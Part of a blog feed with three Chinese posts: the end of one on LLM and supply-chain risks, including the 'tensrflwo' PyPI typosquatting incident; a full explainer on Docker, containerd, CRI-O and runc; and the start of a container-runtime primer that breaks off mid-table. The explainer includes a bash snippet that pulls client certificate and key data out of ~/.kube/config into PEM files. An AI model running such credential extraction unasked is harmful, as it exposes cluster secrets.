后门风险</h4><p>后门风险是指在 AI 应用镜像或软件包中植入隐藏的入口点，攻击者可以通过这些入口点远程控制受感染的系统。在云原生环境中，后门风险尤为严重。云环境中的服务通常是高度可扩展的，一旦后门被植入，攻击者可以迅速扩大攻击范围。由于云原生环境的动态性和复杂性，后门可能长时间不被发现。</p><h4 id="3-4-3-恶意软件包"><a href="#3-4-3-恶意软件包" class="headerlink" title="3.4.3 恶意软件包"></a>3.4.3 恶意软件包</h4><p>在云原生环境中，开发者常常依赖第三方软件包来构建应用。攻击者可能会发布与常用软件包名称相似的恶意软件包，诱导开发者下载。</p><p>2024 年 1 月 15 日，悬镜供应链安全实验室在<a href="https://pypi.org/" title="Pypi">Pypi</a>官方仓库中发现了一起针对 AI 开发者的<a href="https://developer.aliyun.com/article/1424433" title="恶意软件包投毒事件">恶意软件包投毒事件</a>，攻击者通过包名错误拼写 (typo-squatting) 的攻击方式仿冒知名机器学习框架 tensorflow 的包名来实施攻击。投毒攻击目标锁定 AI 开发者，一旦恶意软件包被集成到 AI 应用中，攻击者可能通过这些软件包对整个供应链发起攻击。</p><p><img src="/image/image_wAu9Cbbr9T.png" alt="图 18:tensorflow 包" title="图18:tensorflow 包"></p><p>截至目前，投毒者在 Pypi 仓库共发布 5 个不同版本的恶意包。python 开发者一旦通过 pip 命令下载或安装该投毒包（tensrflwo），则会触发执行 Py 组件包中的恶意后门代码，并最终导致开发者系统被攻击者远程控制。</p><p><img src="/image/image_SjteD2YGef.png" alt="图 19:tensrflwo 包的相关信息" title="图19:tensrflwo 包的相关信息"></p><p>恶意 Py 包 tensrflwo 在 Pypi 官方仓库上的总下载量为 870 次。</p><p><img src="/image/image_zJpJigCcL1.png" alt="图 20:tensrflwo 包的下载次数" title="图20:tensrflwo 包的下载次数"></p><p>该恶意 Py 包已从 Pypi 官方仓库下架，但通过国内主流 Pypi 镜像源 (清华大学、腾讯云等) 依旧可正常下载、安装该恶意包，因此潜在的受害者数量将会更多，尤其对于国内广大使用 tensorflow 深度学习框架的 AI 开发者来说，仍存在被恶意投毒攻击的风险。</p><p><img src="/image/image_OAWnKFwWR8.png" alt="图 21:国内 Pypi 镜像源仍然可正常下载该恶意软件包" title="图21:国内 Pypi 镜像源仍然可正常下载该恶意软件包"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>随着大型语言模型（LLM）在各个领域的应用日益增多，其安全性也日益成为关注的焦点。</p><p>本文，我们简单介绍了 OWASP 所提供的十大 LLM 安全风险。因为云原生环境的开放性、复杂性和资源共享特性，这些风险在云原生场景下尤为突出，使得 LLM 在处理大量数据时可能面临的安全威胁和风险更加多样化。</p><p>为了更好地保障 LLM 的安全性，我们需要从各个方面进行综合考虑。这包括但不限于加强算力平台的安全防护，提升算力网络的安全性，以及加强 AI 应用的安全措施。同时，也需要加强对 LLM 安全性的研究和了解，提高开发者和用户的安全意识，以及采取更加积极主动的安全措施，以应对云原生场景下 LLM 面临的各种风险。</p>]]></content>
    
    
    
    <tags>
      
      <tag>云原生安全</tag>
      
      <tag>LLM 安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>小猫咪带你理清 Docker、containerd、CRI-O 和 runc 之间的区别</title>
    <link href="/2024/07/09/%E5%B0%8F%E7%8C%AB%E5%92%AA%E5%B8%A6%E4%BD%A0%E7%90%86%E6%B8%85Docker%E3%80%81containerd%E3%80%81CRI-O-%E5%92%8C-runc-%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2024/07/09/%E5%B0%8F%E7%8C%AB%E5%92%AA%E5%B8%A6%E4%BD%A0%E7%90%86%E6%B8%85Docker%E3%80%81containerd%E3%80%81CRI-O-%E5%92%8C-runc-%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在<a href="../../../../2024/07/08/%E6%B5%85%E8%B0%88%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E6%97%B6/">《浅谈容器运行时》</a>中，我们了解到：Docker 并不等于容器，它只不过是容器生态系统中一个很不错的选择，我们还可以使用其他的容器运行时（下文统称：容器 Runtime）来运行容器。</p><p>接下来，我们将深入了解容器的生态系统中各个不同的容器 Runtime 之间的区别，如果您正在考虑转向 DevOps，这将是一篇很不错的文章～</p><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>容器的生态系统由新兴的技术、大量的术语和相互竞争的大公司组成。这些公司偶尔会以休战的方式停止竞争，共同建立一个标准。</p><p>这些标准有助于提高整个生态系统的互相操作性，也就是说：我们可以减少对某个公司或项目的依赖性，在不同的平台和操作系统上运行容器。</p><p>容器有以下两大标准：</p><ol><li><a href="https://opencontainers.org/" title="Open Container Initiative">Open Container Initiative</a>（开放式容器倡议，OCI）：为容器颁布了镜像规范、分发规范和运行规范；</li><li><a href="https://kubernetes.io/docs/concepts/architecture/cri/" title="Container Runtime Interface">Container Runtime Interface</a>（容器运行时接口，CRI）：允许我们在 Kubernetes 中使用不同的容器 Runtime 的 API；</li></ol><p>接着，我们来看看下面这张图，了解了解 Docker、Kubernetes、CRI、OCI、containerd 和 runc 在这个生态系统中是如何组合起来使用的。</p><p><img src="/image/image_C1PZBV2I_9.png" alt="图 1：Docker、Kubernetes、OCI、CRI-O、containerd  和 runc 的之间的关系" title="图1：Docker、Kubernetes、OCI、CRI-O、 containerd  和 runc的之间的关系"></p><h2 id="0x02-Docker"><a href="#0x02-Docker" class="headerlink" title="0x02 Docker"></a>0x02 Docker</h2><p>首先，我们来介绍使用范围最广的容器 Runtime：Docker。Docker 公司主要通过开发以下两种用户交互友好的工具来让用户创建和使用容器：</p><ol><li>开发人员可以使用的<a href="https://www.docker.com/products/docker-desktop/" title="Docker Desktop">Docker Desktop</a> ，适用于 Windows、Mac 和 Linux；</li><li>服务器可以使用的<a href="https://docs.docker.com/engine/install/" title="Docker Engine">Docker Engine</a>，适用于 Linux；</li></ol><p><img src="/image/image_B09mDSorN6.png" alt="图 2：Docker Engine VS Docker Desktop" title="图2：Docker Engine VS Docker Desktop "></p><h3 id="2-1-Docker-Desktop"><a href="#2-1-Docker-Desktop" class="headerlink" title="2.1 Docker Desktop"></a>2.1 Docker Desktop</h3><p><strong>Docker Desktop 是一个适用于 Mac、Windows 和 Linux 的 GUI 程序，它可以让我们在自己的电脑中就可以轻轻松松地运行 Docker。</strong></p><p><img src="/image/image_h3yQT7yvML.png" alt="图 3：Docker Destop" title="图3：Docker Destop"></p><p>Docker Desktop 不仅包括运行着 Docker 守护进程的 Linux 虚拟机，还包括 Kubernetes；它有一个非常漂亮的 UI 界面来可视化容器，并且还提供了一种非常简单的用于启动 Kubernetes 的方法。</p><p>虽然说，我们不一定需要使用 Docker Desktop 来使用容器，但这仍然是一个很好的入门的方法。但如果我们是在公司的服务器中使用 Docker 的，我们还是推荐使用 Docker Engine。</p><h3 id="2-1-Docker-Engine-x20"><a href="#2-1-Docker-Engine-x20" class="headerlink" title="2.1 Docker Engine&#x20;"></a>2.1 Docker Engine&#x20;</h3><p>Docker Engine 附带了一系列工具，基本上是一个用于操作容器的 CLI 工具，可以让开发者或系统管理员轻松地构建并运行容器。</p><p><img src="/image/image_9qZXLX0Mnw.png" alt="图 4：Docker Engine" title="图4：Docker Engine"></p><p>docker 命令只是 Docker Engine 中的一个小小的部分，它可以发送构建镜像、拉取镜像、创建容器、启动容器和管理容器等等指令。我们从下往上看，来细数 docker 所使用的工具：</p><ul><li>底层容器 Runtime：<a href="https://github.com/opencontainers/runc" title="runc">runc</a> 主要使用 Linux 的原生功能来创建并运行容器。它包含一个名为 <a href="https://pkg.go.dev/github.com/opencontainers/runc/libcontainer" title="Libcontainer">Libcontainer</a>的用于创建容器的 Go 库，是一个底层的容器 Runtime。</li><li>高层容器 Runtime：<a href="https://containerd.io/" title="containerd">containerd</a>在底层容器 Runtime 之上，它添加了一系列额外的功能，例如：镜像的传输、存储和网络等，它完全支持 OCI 规范。</li><li>Docker 守护进程：<a href="https://docs.docker.com/reference/cli/dockerd/" title="Dockerd">Dockerd</a> 是 docker 的一个守护进程（即在后台长时间运行的进程），它提供了标准的 API，可以与容器 Runtime 进行通信。</li><li>Docker CLI 工具：<a href="https://github.com/docker/cli" title="Docker-cli">Docker-cli</a>是 Docker 的 CLI 工具，它可以让我们使用 Docker 命令与 Docker 守护进程交互，这样一来，我们无需了解一些底层原理就可以控制容器了。</li></ul><p><img src="/image/image_p1yPy0G9nW.png" alt="图 5：使用 Docker 运行容器所牵涉到的工具" title="图5：使用 Docker运行容器所牵涉到的工具"></p><p>总而言之，当我们使用 Docker 的时候，这些工具的调用链如下所示：</p><ol><li>通过 Docker CLI 工具给 Docker 守护进程发送指令；</li><li>Docker 守护进程调用 containerd 来管理容器；</li><li>containerd 调用 runc 来创建并运行容器；</li></ol><h3 id="2-3-Kubernetes-可以使用-Docker-吗？"><a href="#2-3-Kubernetes-可以使用-Docker-吗？" class="headerlink" title="2.3 Kubernetes 可以使用 Docker 吗？"></a>2.3 Kubernetes 可以使用 Docker 吗？</h3><p>总有人会问：“Kubernetes 中使用的是容器 Runtime 是 Docker 吗？”，若放在以前，答案是“YES”，而现在是“NO”了。</p><p>最初，Kubernetes 确实是使用 Docker Engine 来运行容器的，但随着时间的推移，Kubernetes 创建了 CRI 接口，它允许用户将不同的容器 Runtime 接入其中，于是 Kubernetes 渐渐的演变成了一个与容器无关的平台了。</p><p>Docker Engine 是一个比 Kubernetes 更早的项目，且并未实现 CRI。因此，为了弥补新世界与旧世界之间的鸿沟，Kubernetes 包含了一个名为 dockershim 的组件，它允许 Kubernetes 使用 Docker 作为容器 Runtime 来运行容器。<strong>但 Kubernetes 自 1.24 版本开始，就将 dockershim 组件被完全删除了，所以 Kubernetes 不再原生地支持 Docker 作为容器 Runtime 了。</strong> 如果要给 Kubernetes 选择一个容器 Runtime，那么这个容器 Runtime 必得兼容 CRI 规范，我们可以选择 containerd、CRI-O 等等。</p><p><img src="/image/image_4K6Q4nXhVB.png" alt="图 6：早期的 Kubernetes 通过 dockershim 使用 docker，如今已完全移除 dockershim 了" title="图6：早期的Kubernetes通过 dockershim 使用 docker，如今已完全移除dockershim了"></p><p>在这里，需要澄清的一点是：<strong>这一转变这并不意味着 Kubernetes 不能运行 Docker 格式的容器了</strong>。因为 containerd 和 CRI-O 无需执行 Docker 命令或使用 Docker 守护进程即可在 Kubernetes 中运行 Docker 格式和 OCI 格式的镜像。</p><h2 id="0x03-OCI-和-CRI"><a href="#0x03-OCI-和-CRI" class="headerlink" title="0x03 OCI 和 CRI"></a>0x03 OCI 和 CRI</h2><p>在阅读前面的内容的时候，大家会反复听到 OCI 和 CRI 两个标准，那么这两个标准具体是干嘛的呢？这些标准主要的作用在于：我们可以在不同的平台上运行容器。</p><h3 id="3-1-OCI"><a href="#3-1-OCI" class="headerlink" title="3.1 OCI"></a>3.1 OCI</h3><p>由于 Docker 公司在 Docker 开源项目的发展上始终保持着绝对的权威和发言权，并在多个场合用实际行动挑战了 CoreOS、RetHat、谷歌和微软等玩家的切身利益。</p><p>2015 年 6 月 22 日，由 Docker、CoreOS 和容器领域的其他公司共同宣布：Docker 公司捐献其容器格式、容器运行时和 runc，交由一个完全中立的基金会管理，并且以 runc 为依据，制定一套名为<a href="https://opencontainers.org/" title="OCI">OCI</a>（Open Container Initiative，开放容器倡议）的规范。<strong>OCI 是最早为容器制定标准的组织之一，他们共同维护容器的镜像标准（</strong><a href="https://github.com/opencontainers/image-spec" title="image-spec"><strong>image-spec</strong></a><strong>）、分发标准（</strong><a href="https://github.com/opencontainers/distribution-spec" title="distribution-spec"><strong>distribution-spec</strong></a><strong>）和运行标准（</strong><a href="https://github.com/opencontainers/runtime-spec" title="runtime-spec"><strong>runtime-spec</strong></a><strong>）</strong>。</p><p><img src="/image/image_Mea-jK8vzd.png" alt="图 7：OCI 规范" title="图7：OCI规范"></p><p>OCI 规范主要思考的是：<strong>标准化容器是什么以及它能够做什么？</strong> 这意味着，你可以为不同的平台选择不同的容器 Runtime，即使它们的底层实现不一样，但只要它们都满足 OCI 规范，我们就可以将它们组合起来一起使用。例如，我们可以为我们的 Linux 主机选择符合 OCI 规范的容器 Runtime，然后为 Windows 主机选择符合 OCI 规范的另外一种容器 Runtime。</p><h3 id="3-2-CRI"><a href="#3-2-CRI" class="headerlink" title="3.2 CRI"></a>3.2 CRI</h3><p>我们需要讨论的另外一个标准就是由 Kubernetes 创建的 CRI 了。由上文得知，Kubernetes 创建了 CRI 接口，允许用户将不同的容器 Runtime 接入到集群中，对容器进行操作与管理。Kubernetes 不关心用户使用的是哪种容器 Runtime，它只关心自己是否可以向容器 Runtime 发送为 Pod 创建容器、终止容器等指令。</p><p><img src="/image/image_ZArvIyjSRe.png" alt="图 8：Kubernetes 官网上关于 CRI 的介绍" title="图8：Kubernetes 官网上关于 CRI的介绍"></p><p><strong>CRI 主要描述了 Kubernetes 如何与 Runtime 进行交互</strong>。如图所示，只要我们所使用的容器 Runtime 实现了 CRI 的 API 接口，它就可以按照自己喜欢的方式创建并启动容器，而 Kubernetes 也不用单独地增加对每个容器 Runtime 的支持了。</p><p><img src="/image/image_bRJQi0u_go.png" alt="图 9：CRI 在 Kubernetes 和容器 Runtime 之间的作用" title="图9：CRI在Kubernetes和容器Runtime之间的作用"></p><p>如果我们只是一个终端使用客户（例如开发者），我们对容器 Runtime 的选择应该基于它们所提供的功能和性能，而不是它们之间实现的细微差别，因为它们都是可插拔并且无缝更改的。</p><p>但如果我们选择从供应商那里购买支持服务（比如安全更新、错误修复等），那么我们对容器 Runtime 的选择会受到供应商的影响或限制。例如，<a href="https://www.redhat.com/en/blog/red-hat-openshift-container-platform-4-now-defaults-cri-o-underlying-container-engine" title="Red Hat 的 OpenShift 使用 CRI-O">Red Hat 的 OpenShift 使用 CRI-O</a>，并为 CRI-O 提供官方支持，包括安全更新和错误修复等服务；Docker 为 containerd 提供支持服务，包括安全更新、错误修复等，确保用户在使用 containerd 时能够得到必要的帮助。</p><p>在<a href="https://www.tutorialworks.com/kubernetes-architecture/" title="Kubernetes架构">Kubernetes 架构</a>中，<code>kubelet</code>（在每个节点上运行的代理）负责向容器 Runtime 发送指令来启动并运行容器。所以我们可以通过查看<code>kubelet</code>的参数来了解我们正在使用的容器 Runtime 是什么。我们可以重点关注的参数有<code>--container-runtime</code>和<code>--container-runtime-endpoint</code>。</p><p>在 kubernetes v1.30.0 中，我们无法找到<code>kubelet</code>的<code>container-runtime</code>参数，且它的<code>--container-runtime-endpoint</code>已经被弃用，我们只能在 config 文件中指定<code>container-runtime-endpoint</code>的内容，并由参数<code>--config</code>传递给<code>kubelet</code>。</p><p><img src="/image/image_NKzdAAvDmq.png" alt="图 10:kubernetes v1.30.0 中，kubelet 已经弃用 --container-runtime-endpoint 参数" title="图10:kubernetes v1.30.0 中，kubelet 已经弃用 --container-runtime-endpoint 参数"></p><p><img src="/image/image_s2hddJLMWd.png" alt="图 11：但我们仍然可以通过配置文件来传递 container-runtime-endpoint 的值" title="图11：但我们仍然可以通过配置文件来传递 container-runtime-endpoint 的值"></p><p>如果，我们想要查看<code>container-runtime-endpoint</code>的内容，应该怎么做呢？</p><p>首先，我们得开启一个代理服务器；</p><p><img src="/image/image_4X7bXfoSWF.png" alt="图 12：kubectl proxy" title="图12： kubectl proxy"></p><p>然后，在一个新的终端里，使用<code>curl</code> 对以下 API 发起 GET 请求，并使用<code>jq</code> 格式化所返回的 json 数据（记得根据实际情况替换<code>&lt;node-name&gt;</code>）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X GET http://127.0.0.1:8001/api/v1/nodes/&lt;node-name&gt;/proxy/configz | jq .<br></code></pre></td></tr></table></figure><p><img src="/image/image_mEUWulm1Eg.png" alt="图 13：查看 container-runtime-endpoint 的值" title="图13：查看 container-runtime-endpoint 的值"></p><p>通过上述操作，我们需要意识到：<strong>当我们在研究 kubernetes 的时候，特别需要关注其版本信息，因为 kubernetes 在发展过程中，各种功能和参数的调整和弃用非常常见</strong>。查看 Kubernetes 的容器 Runtime 更可靠的方法应该是使用 kubectl 获取更多的节点信息，这往往也会输出容器 Runtime 的信息。</p><p><img src="/image/image_6_gDaJxrJq.png" alt="图 14：使用 kubectl get nodes -o wide，让 kubectl 输出节点的信息的同时，输出容器 Runtime 的信息" title="图14：使用 kubectl get nodes -o wide，让kubectl输出节点的信息的同时，输出容器 Runtime的信息 "></p><p>当然，也并不是所有的节点都会安装<code>kubectl</code>的，<code>kubectl</code>也只是向<code>api server</code>发起请求而已。所以，我们也可以使用 <code>curl</code> 去询问<code>api server</code>：“你的节点信息是多少呀？”，我们提供了一个“一站式命令”，可以在询问的时候带上证书信息，当然前提是，我们所带上的证书信息可以有访问所有节点的信息的权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> clientcert=$(grep client-cert ~/.kube/config |<span class="hljs-built_in">cut</span> -d<span class="hljs-string">&quot; &quot;</span> -f 6)<br><span class="hljs-built_in">export</span> clientkey=$(grep client-key-data ~/.kube/config |<span class="hljs-built_in">cut</span> -d<span class="hljs-string">&quot; &quot;</span> -f 6)<br><span class="hljs-built_in">export</span> certauth=$(grep certificate-authority-data ~/.kube/config |<span class="hljs-built_in">cut</span> -d<span class="hljs-string">&quot; &quot;</span> -f 6)<br><span class="hljs-built_in">export</span> api_server=$(grep server ~/.kube/config|<span class="hljs-built_in">cut</span> -d<span class="hljs-string">&quot; &quot;</span> -f 6)<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$clientcert</span> | <span class="hljs-built_in">base64</span> -d &gt; ./client.pem<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$clientkey</span> | <span class="hljs-built_in">base64</span> -d &gt; ./client-key.pem<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$certauth</span> | <span class="hljs-built_in">base64</span> -d &gt; ./ca.pem<br><span class="hljs-comment"># kubectl -v=8 cmd 可以直接获取api接口地址</span><br>curl --cert ./client.pem --key ./client-key.pem --cacert ./ca.pem <span class="hljs-variable">$api_server</span>/api/v1/nodes | jq .items[].status.nodeInfo.containerRuntimeVersion<br></code></pre></td></tr></table></figure><p><img src="/image/image_XNp6LYZJQi.png" alt="图 15：带上证书信息，向 API Server 发起请求，并从返回的结果中过滤容器 Runtime 的信息" title="图15：带上证书信息，向API Server 发起请求，并从返回的结果中过滤容器 Runtime 的信息"></p><p>如果你问我，如何快速知道：执行一个 kubeclt 命令，实际上发起了什么请求。我只能告诉你，可以使用 <code>-v 8</code>打印出更多的 debug 信息。</p><p><img src="/image/image_YwCeOOAq3r.png" alt="图 16：使用 -v 8 查看更多的信息" title="图16：使用 -v 8 查看更多的信息"></p><p>那么我们如何看待 CRI 呢？容器本身不产生价值，产生价值的是容器编排，而 Kubernetes 在容器编排的世界里又占据主导的地位，CRI 可以让 Kubernetes 轻松松松地就可以使用各种不同的容器 Runtime，所以 Kubernetes 所定义的<strong>CRI 是现在乃至未来可能存在的任何类型的容器 Runtime 的抽象</strong>。</p><h2 id="0x04-containerd-和-CRI-O"><a href="#0x04-containerd-和-CRI-O" class="headerlink" title="0x04 containerd 和 CRI-O"></a>0x04 containerd 和 CRI-O</h2><p>通过上文，我们知道 Docker Engine 会调用一些底层的工具，那么这些工具又是什么呢？它们是如何组织起来的呢？我们来看看第一层高级的容器 Runtime，那就是由 Docker 创建的 containerd 和 Red Hat 创建的 CRI-O。</p><h3 id="4-1-containerd"><a href="#4-1-containerd" class="headerlink" title="4.1 containerd"></a>4.1 containerd</h3><p>containerd 是来自于 Docker 的较高层的容器 Runtime，它实现了 CRI 规范，并且可以从仓库中拉取镜像进行管理，然后移交给较底层的容器 Runtime。底层的容器 Runtime 最终会使用 Linux 内核的功能来创建被我们称之为“容器”的进程。</p><p>containerd 诞生于 Docker 的项目里的一部分，但为什么要分开呢？主要是 containerd 可以让 Docker 的代码更加模块化，让“Docker 风格”的容器无需使用 Docker 守护进程和 Docker CLI 工具，就可以在更多的编排工具（例如 Kubernetes）中运行。</p><p><img src="/image/architecture_tqfjjdsGBK.png" alt="图 17：containerd 的架构图" title="图17：containerd 的架构图"></p><p>当我们查看 Docker 的官方下载文档的时候，我们应该也注意到了：安装 Docker 的时候，还需要安装 containerd。那是因为 Docker Engine 内部会使用到 containerd。</p><p><img src="/image/image_Kjed0bvzDM.png" alt="图 18：在 ubuntu 中安装 docker 还需要安装 containerd " title="图18：在 ubuntu中安装 docker还需要安装containerd"></p><p>我们也可以使用 containerd 作为 Kubernetes 的容器 Runtime，因为 conatinerd 通过 <code>cri</code>插件，实现了 Kubernetes 的 CRI。</p><h3 id="4-2-CRI-O"><a href="#4-2-CRI-O" class="headerlink" title="4.2 CRI-O"></a>4.2 CRI-O</h3><p><a href="https://cri-o.io/" title="CRI-O">CRI-O</a>又是另外一个实现了 Kubernetes CRI 的高层容器 Runtime，它是 containerd 的替代品，可以从仓库中拉取镜像，并在磁盘上进行管理，然后调用较底层的容器 Runtime 来启动容器。</p><p><img src="/image/image_BnAIX0hX3X.png" alt="图 19：ORI-O 架构图" title="图19：ORI-O 架构图"></p><p><a href="https://thenewstack.io/oci-building-way-kubernetes-run-containers-without-docker/" title="CRI脱胎于RedHat、TBM、Intel和SUSE等公司">CRI 脱胎于 RedHat、TBM、Intel 和 SUSE 等公司</a>，是为了成为 Kubernetes 的容器 Runtime 所创建的，它和 containerd 一样，可以提供启动、停止和重启容器的能力。</p><h2 id="0x05-runc-VS-其他底层容器-Runtime"><a href="#0x05-runc-VS-其他底层容器-Runtime" class="headerlink" title="0x05 runc VS 其他底层容器 Runtime"></a>0x05 runc VS 其他底层容器 Runtime</h2><h3 id="5-1-runc"><a href="#5-1-runc" class="headerlink" title="5.1 runc"></a>5.1 runc</h3><p>runc 是一个兼容 OCI 规范的容器 Runtime，可以创建并运行容器。有时，runc 甚至被称之为 OCI 的“参考实现”。</p><p><img src="/image/image_A0kNnz5-Hh.png" alt="图 20:runc 的架构图" title="图20:runc 的架构图"></p><p>参考实现（reference implementation）是一种完全实现了某个规范或标准的所有要求的软件。runc 提供了一个符合 OCI 规范的容器 Runtime 所期待的所有特性，以供任何人参考，创建自己所需要的 OCI Runtime。</p><p>runc 与 Linux 原生的底层功能（例如 namespace 和 cgroup）进行交互，为容器提供所有的底层功能来创建并运行容器。</p><p>runc 是许多容器 Runtime 的基石，所以每当被曝出漏洞的时候，往往是一片哀嚎。我们来举个不恰当的例子，如下图所示，当然这也不是一个十分严谨的比喻，毕竟 runc 是由 OCI 维护的，而不是个人开发者。</p><p><img src="/image/image_Ys01c-WXAX.png" alt="图 21：一个不恰当的例子" title="图21：一个不恰当的例子"></p><h3 id="5-2-其他的底层容器-Runtime"><a href="#5-2-其他的底层容器-Runtime" class="headerlink" title="5.2 其他的底层容器 Runtime"></a>5.2 其他的底层容器 Runtime</h3><p>但是，runc 并不是唯一的底层容器 runtime，因为 OCI 规范运行其他的工具以不同的方式实现相同的功能：</p><ul><li><a href="https://github.com/containers/crun" title="crun">crun</a>：一个用 C 编写的容器 Runtime（相比之下，runc 是用 Go 写的，Go 在云原生的生态中是主流的编程语言）。</li><li><a href="https://github.com/firecracker-microvm/firecracker-containerd" title="firecracker-containerd">firecracker-containerd</a>：是 AWS 所开发的底层的容器 Runtime，它可以将 OCI 规范实现成单独的轻量级的虚拟机，并且还是支持 AWS Lambda 的相同技术（和 runc 相比，firecracker-containerd 提供了虚拟机级别的隔离；和虚拟机相比，firecracker-containerd 更轻量级，启动速度更快，资源占用更少）。</li><li><a href="https://gvisor.dev/" title="gVisor">gVisor</a>：是 Google 所开发的底层的容器 Runtime，它可以创建拥有自己的内核的容器，而无需和宿主机共享内核。同时，gVisor 还在<code>runsc</code>中兼容 OCI 规范。</li></ul><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>本文，我们了解到了 Docker 只是容器生态系统中的一部分。</p><p>理论上来说，只要我们选用的容器 Runtime 符合同一组标准，那么我们可以在使用中无缝切换。像是 containerd、runc 和 CRI-O 都实现了这些标准的部分内容。</p><p>在 Kubernetes 中，我们可以选择各种容器 Runtime，只要它实现了 CRI 的规范，例如 containerd 和 CRI-O 等等；</p>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈容器运行时</title>
    <link href="/2024/07/08/%E6%B5%85%E8%B0%88%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E6%97%B6/"/>
    <url>/2024/07/08/%E6%B5%85%E8%B0%88%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E6%97%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>容器运行时（Container Runtime，简称 Runtime）需要通过和操作系统内核进行紧密协作，来为容器提供运行环境，是容器真正运行的地方。</p><p>如果大家使用过 Java，可以简单认为 Java 程序就是容器，JVM 就是 Runtime；JVM 需要为 Java 程序提供运行环境，而容器需要在 Runtime 中运行。</p><p>接下来，我们以新手的视角来浅谈一下容器运行时的功能、类型、常见工具以及安全风险～</p><h2 id="0x01-Runtime-的功能"><a href="#0x01-Runtime-的功能" class="headerlink" title="0x01 Runtime 的功能"></a>0x01 Runtime 的功能</h2><p>容器技术起源于早期的 Unix 系统。在<a href="../../../../2024/06/07/%E7%AC%AC-1-%E8%AF%BE-%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/">《第 1 课 容器安全威胁建模》</a>中，我们了解到：<strong>2013 年 3 月 15 日 Docker 问世，为开发者提供了一种便捷的打包方式，使应用程序“一处构建，处处运行”，以至于容器再次“翻红”，形成一道新的科技浪潮。</strong></p><p><img src="/image/image_Z3pz0-REoT.png" alt="图 1：Docker 的创始人 Solomon Hykes 在 PyCon 上首次向全世界公开展示了 Docker" title="图 1 ：Docker 的创始人Solomon Hykes在 PyCon 上首次向全世界公开展示了 Docker"></p><p>与虚拟机不同，<strong>容器与宿主机共享操作系统内核</strong>，在效率上更快一些，这种效率使得容器成为部署微服务、实现可扩展、高性能应用程序的理想选择。</p><p><img src="/image/image_4Bo492biJE.png" alt="图 2：Docker 容器 VS 虚拟机" title="图 2：Docker 容器 VS 虚拟机"></p><p>但正如 CNCF 的年度报告所调查的那样：“一个公司使用容器的范围越广，他们就越有可能将安全性视为容器的一大难题”。</p><p>理解容器的核心功能对于理解 Runtime 如何促进容器的无缝执行和如何管理容器至关重要。</p><h3 id="1-1-Runtime-运行容器的步骤"><a href="#1-1-Runtime-运行容器的步骤" class="headerlink" title="1.1 Runtime 运行容器的步骤"></a>1.1 Runtime 运行容器的步骤</h3><ol><li><strong>创建容器</strong>，并根据镜像中的应用程序及其依赖初始化环境；</li><li><strong>运行容器</strong>，启动应用程序并确保其正常运行；</li><li><strong>管理容器的生命周期</strong>，例如：<ol><li>监控容器的运行状况；</li><li>在容器发生故障的时候重启容器；</li><li>在不使用容器时清理资源；</li></ol></li></ol><h3 id="1-2-与宿主机的操作系统交互"><a href="#1-2-与宿主机的操作系统交互" class="headerlink" title="1.2 与宿主机的操作系统交互"></a>1.2 与宿主机的操作系统交互</h3><p>Runtime 需要与宿主机的操作系统进行紧密交互。例如操作系统的<a href="https://blog.nginx.org/blog/what-are-namespaces-cgroups-how-do-they-work" title="namespace 和cgroup">namespace 和 cgroup</a>。</p><p><strong>它们利用操作系统的各种功能来隔离和管理每个容器的资源</strong>，确保容器内的进程无法干扰其他的容器或宿主机，从而保持一个安全稳定的环境。</p><h3 id="1-3-资源的分配和管理"><a href="#1-3-资源的分配和管理" class="headerlink" title="1.3 资源的分配和管理"></a>1.3 资源的分配和管理</h3><p>Runtime 还是资源管理的重要组成部分，因为它们可以为每个容器分配和调节 CPU、内存和 I&#x2F;O，以防止过度占用资源。</p><p>这种特性在多租户环境中尤为常见，若要了解多租户相关的知识，请查看<a href="../../../../2024/06/17/1-4-%E5%A4%9A%E7%A7%9F%E6%88%B7/">《1.4 多租户》</a>。</p><h2 id="0x02-Runtime-VS-Engine"><a href="#0x02-Runtime-VS-Engine" class="headerlink" title="0x02 Runtime VS Engine"></a>0x02 Runtime VS Engine</h2><p>虽然容器运行时（Container Runtime，简称 Runtime）负责运行容器，但容器引擎（Container Engine，简称 Engine）是一个更广泛的系统。Engine 可以管理更多的容器生命周期，例如：镜像的分发、容器的编排和 Runtime 的管理。</p><p>一个常见的误区是：Runtime 等于 Engine。以 Docker 为例，虽然 Docker 的 Engine 包含了 Runtime，但它还提供了一套用于构建、交付和运行容器化应用程序的工具。</p><h2 id="0x03-Runtime-的类型"><a href="#0x03-Runtime-的类型" class="headerlink" title="0x03 Runtime 的类型"></a>0x03 Runtime 的类型</h2><p>为了满足基本的容器运行到复杂的容器编排的需求，容器运行时大致可以分为底层的 Runtime、高层的 Runtime 和专门的 Runtime。这些 Runtime 的独特功能及抽象程度如下所示：</p><table><thead><tr><th>类型</th><th>描述</th><th>特征</th><th>资源管理</th><th>与 Linux 